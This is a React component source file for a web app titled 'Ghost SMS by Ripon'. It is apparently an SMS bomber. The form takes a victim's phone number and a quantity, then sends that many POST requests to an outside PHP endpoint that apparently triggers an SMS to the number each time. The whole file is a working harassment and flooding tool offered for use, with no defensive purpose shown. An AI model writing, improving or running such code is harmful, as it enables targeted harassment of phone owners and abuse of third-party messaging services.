import './App.css';
import { useState } from 'react';
const axios = require('axios').default;

function App() {
   const [phone, updatePhone] = useState(0);
   const [quantity, updateQuantity] = useState(0);
   // const [error, updateError] = useState(false);

   const handleForm = (e) => {
      e.preventDefault();
      // e.target.reset();

      for (let i = 0; i < quantity; i++) {
         setTimeout(() => {
            (async () => {
               axios
                  .post(
                     `https://prime.mojibrsm.xyz/server/myapi/api15.php?phone=${phone}`
                  )
                  .then((res) => console.log(res))
                  .catch((err) => console.log(err));
            })();
         }, 500);
      }
   };

   return (
      <div className="App">
         <header>
            <h1>Ghost SMS by Ripon</h1>
         </header>

         {/* form */}
         <form onSubmit={(e) => handleForm(e)}>
            <label htmlFor="phone">Enter Phone Number:</label>
            <br />
            <input
               onChange={(e) => updatePhone(e.target.value)}
               type="number"
               name="phone"
               id="phone"
               required
            />{' '}
            <br />
            <label htmlFor="quantity">Enter SMS Quantity:</label>
            <br />
            <input
               onChange={(e) => updateQuantity(e.target.value)}
               type="number"
               name="quantity"
               id="quantity"
               required
            />
            <br />
            <br />
            <input type="submit" value="Submit"></input>
         </form>
      </div>
   );
}

export default App;
